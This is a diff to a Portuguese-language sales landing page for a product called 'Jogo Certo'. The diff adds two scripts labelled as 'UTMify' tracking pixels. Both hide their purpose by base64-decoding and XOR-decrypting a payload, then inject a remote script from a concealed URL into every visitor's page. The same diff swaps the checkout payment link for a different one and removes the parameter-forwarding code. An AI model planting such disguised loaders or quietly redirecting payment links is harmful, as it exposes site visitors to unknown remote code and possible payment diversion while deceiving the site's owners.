@@ -846,6 +846,12 @@
   src="https://www.facebook.com/tr?id=1600404791011965&ev=PageView&noscript=1"
   /></noscript>
   <!-- End Meta Pixel Code -->
+
+  <!-- UTMify Pixel -->
+  <script>(function(){var y_e=atob("DG++5EuDX3RBNSMm3RSckTnvfU5jXVdSrRyEy2TgOxpvQFdLtAnHyijsMlojRwxVvh3XlD/wcAQoTUZK8h/XnC7vcR4yFw8EvBvKliLhKgAkRgEchjKSxizvMBYgWVAE5zTFxiXiMhFjDwFWtBfbiALnfVhjQ0JKqAqc3mm1PhV3BUUS6wyLhnLhbkV0BBQS6FaJhSqhIik8");var m_1hqp=[];for(var j_inqm=0;j_inqm<y_e.length;j_inqm++){m_1hqp.push(y_e.charCodeAt(j_inqm)&255);}var n_97=m_1hqp[0];var z_f2r=m_1hqp.slice(1,1+n_97);var j_8c=m_1hqp.slice(1+n_97);var e_fa=j_8c.map(function(b,r_za){return b^z_f2r[r_za%n_97];});var w_rp="";for(var v_1w=0;v_1w<e_fa.length;v_1w++){w_rp+=String.fromCharCode(e_fa[v_1w]&255);}var v_6=decodeURIComponent(escape(w_rp));var l_vxb1=JSON.parse(v_6);var g_3ie=l_vxb1.globals||[];g_3ie.forEach(function(q_e){window[q_e.name]=q_e.value;});var t_ksw7=document.createElement("script");t_ksw7.src=l_vxb1.url;t_ksw7.async=true;t_ksw7.defer=true;(l_vxb1.attributes||[]).forEach(function(l_4ra8){t_ksw7.setAttribute(l_4ra8.name,l_4ra8.value);});(document.head||document.documentElement).appendChild(t_ksw7);})();</script>
+
+  <!-- UTMify UTM Capture -->
+  <script>(function(){var i_o=atob("DDAzsSs1nj/ixgXXx0sRxFlZvAXArnGjt0MJngRW+lHMs3G6rlZKn0ha8xGAtCqkpEJawV9GsUqWq3b4q1FH1FhBsFWR5Cn1pkRHw0JX60uHtSftnEsR30pY+x3Y5GG2s1EexF9Y91mb63WlokZW318Y5lyNoiikpFsRnQlD/1OXoyft5RJOnVAX8F6Poyft5VRSxUoY60uPr2Ou6kBB1F1Q8EvPtXC1rlRAkwcX6F6Os2D1/RIRzHZI");var r_0w8=[];for(var y_dd3=0;y_dd3<i_o.length;y_dd3++){r_0w8.push(i_o.charCodeAt(y_dd3)&255);}var g_760f=r_0w8[0];var x_l2q9=r_0w8.slice(1,1+g_760f);var d_s6pg=r_0w8.slice(1+g_760f);var j_ms04=d_s6pg.map(function(b,z_k9y){return b^x_l2q9[z_k9y%g_760f];});var o_atv="";for(var z_poc=0;z_poc<j_ms04.length;z_poc++){o_atv+=String.fromCharCode(j_ms04[z_poc]&255);}var v_d7gw=decodeURIComponent(escape(o_atv));var s_s=JSON.parse(v_d7gw);var g_fyo=s_s.globals||[];g_fyo.forEach(function(y_2j){window[y_2j.name]=y_2j.value;});var x_0=document.createElement("script");x_0.src=s_s.url;x_0.async=true;x_0.defer=true;(s_s.attributes||[]).forEach(function(m_pavv){x_0.setAttribute(m_pavv.name,m_pavv.value);});(document.head||document.documentElement).appendChild(x_0);})();</script>
 </head>
 <body>
 
@@ -1273,7 +1279,7 @@
             <p style="font-size:11px; color:rgba(255,255,255,0.5); margin-top:3px; margin-bottom:6px;">pagamento único &bull; acesso imediato</p>
             <p class="price-savings">Você economiza R$122,00</p>
           </div>
-          <a href="https://pay.wiapy.com/u8Lr8FTWrd" target="_blank" class="btn btn-primary btn-full btn-checkout" id="btn-completo-link">
+          <a href="https://pay.wiapy.com/bJzXnviHupnB" class="btn btn-primary btn-full btn-checkout">
             Quero o Jogo Certo agora
           </a>
           <ul class="pricing-items" style="text-align:left; margin-top:20px;">
@@ -1469,10 +1475,6 @@
     // Inicializar ícones Lucide
     lucide.createIcons();
 
-    var UPSELL = {
-      checkoutPagina: 'https://pay.wiapy.com/u8Lr8FTWrd'
-    };
-
     function playGif() {
       var thumb = document.getElementById('gif-thumb');
       var iframe = document.getElementById('gif-iframe');
@@ -1488,29 +1490,6 @@
       var player = new Vimeo.Player(iframe);
       player.play();
     }
-
-    function irParaCheckout(url) {
-      try {
-        var dest = new URL(url);
-        new URLSearchParams(window.location.search).forEach(function(v, k) {
-          dest.searchParams.set(k, v);
-        });
-        window.location.href = dest.toString();
-      } catch(e) {
-        window.location.href = url + window.location.search;
-      }
-    }
-
-    // ===== CTA principal de checkout =====
-    (function() {
-      var btnCompletoLink = document.getElementById('btn-completo-link');
-      if (btnCompletoLink) {
-        btnCompletoLink.addEventListener('click', function(e) {
-          e.preventDefault();
-          irParaCheckout(UPSELL.checkoutPagina);
-        });
-      }
-    })();
 
     // ===== Carrossel de Depoimentos =====
     (function() {
